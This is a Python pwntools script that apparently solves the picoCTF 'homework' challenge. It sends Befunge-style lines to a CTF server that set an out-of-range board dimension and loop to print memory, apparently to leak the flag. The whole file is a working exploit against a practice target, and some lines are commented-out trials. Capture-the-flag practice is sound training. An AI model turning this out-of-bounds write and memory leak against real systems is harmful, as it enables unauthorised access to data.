from pwn import *
elf = ELF("/home/kali/Downloads/homework")
p=elf.process()
p=remote('mars.picoctf.net', 31689)

#gdb.attach(p, gdbscript='')

p.recvuntil(b"sol")

#push 125 to the stack, push 2
p.sendline(b'0!::+:++::**>>0!:+v') #0-13

#2<-4, push 50
p.sendline(b'v00:*+::++:+::!0+:<') #stack = [125, 4, 50] and we set board[0][0] to 50
p.sendline(b'>pp00g>>>>>>>>>>>>v') #cols=125, stack = [50], move to loop
p.sendline(b'>>>>>0!+:00gg,>>>>>') #stack[x+1], stack[x+1, x+1], stack[x+1,x+1,50], print repeat

#p.sendline(b'  vp*+::++:+::!0+:<') #0



#0!::+:++::**>>0!:+v
#@,,,*+::++:+::!0+:<

p.interactive()
